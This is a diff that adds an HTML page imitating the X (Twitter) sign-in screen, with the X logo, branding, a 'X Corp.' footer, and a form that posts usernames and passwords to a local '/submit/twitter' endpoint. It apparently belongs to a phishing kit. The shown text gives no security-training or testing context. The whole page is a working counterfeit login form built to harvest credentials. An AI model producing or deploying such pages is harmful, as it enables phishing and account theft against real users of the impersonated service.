@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Log in to X</title>
+<style>
+body { font-family: Helvetica, Arial, sans-serif; background: #ffffff; margin: 0; }
+.container {
+  max-width: 400px;
+  width: 90%;
+  margin: 50px auto;
+  padding: 20px;
+  background: #fff;
+  border-radius: 16px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  text-align: center;
+}
+.logo { margin-bottom: 20px; }
+.logo svg { width: 50px; height: 50px; }
+h2 { font-weight: normal; margin-bottom: 20px; font-size: 24px; }
+input[type="text"], input[type="password"], input[type="email"] {
+  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
+  border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box;
+}
+button {
+  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
+  background: #1da1f2; color: white; border: none; border-radius: 9999px;
+  font-size: 16px; font-weight: bold; cursor: pointer; box-sizing: border-box;
+}
+button:hover { background: #0d8ddb; }
+a { display: block; margin-top: 15px; color: #1da1f2; text-decoration: none; font-size: 14px; }
+a:hover { text-decoration: underline; }
+.footer { margin-top: 20px; font-size: 12px; color: #777; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#1da1f2" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+    </svg>
+  </div>
+  <h2>Sign in to X</h2>
+  <form method="POST" action="/submit/twitter">
+    <input type="text" name="email" placeholder="Phone, email, or username" required autofocus autocomplete="username" />
+    <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" />
+    <button type="submit">Log In</button>
+  </form>
+  <a href="#">Forgot password?</a>
+  <a href="#">Sign up</a>
+  <div style="background:#f7f7f7; padding:10px; font-size:12px; text-align:center; color:#555; margin-top:15px;">
+    By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
+  </div>
+</div>
+<div class="footer">
+  X Corp. © 2025
+</div>
+</body>
+</html>
